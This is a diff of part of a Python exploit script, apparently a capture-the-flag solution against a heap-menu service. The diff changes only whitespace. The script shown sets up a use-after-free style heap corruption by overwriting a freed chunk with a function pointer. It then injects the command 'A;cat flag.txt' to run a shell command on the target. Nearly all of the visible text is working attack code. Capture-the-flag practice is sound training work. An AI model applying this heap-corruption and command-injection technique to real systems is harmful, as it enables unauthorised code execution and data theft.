@@ -66,47 +66,34 @@ def main():
 
 
     r = conn()
-
     menu(r)
 
     malloc(r, b'0', b'16', b'AAAAAAAA')
-
     menu(r)
 
     malloc(r, b'1', b'16', b'AAAAAAAA')
-
     menu(r)
 
     malloc(r, b'2', b'16', b'AAAAAAAA')
-
     menu(r)
 
     free(r,b'2')
-
     menu(r)
 
     free(r,b'1')
-
     menu(r)
 
     malloc(r, b'1', b'56', b'Z' * 32 + p64(execute_chunk_ping) )
-
     menu(r)
 
-
     edit_chunck(r, b'2', b'A;cat flag.txt')
-
     menu(r)
 
     execute(r, b'2')
-
-
     rep = r.recv()
     print(rep)    
-
-
     rep = r.recv()
-    print(rep)    
+    print(rep)
 
 if __name__ == "__main__":
     main()
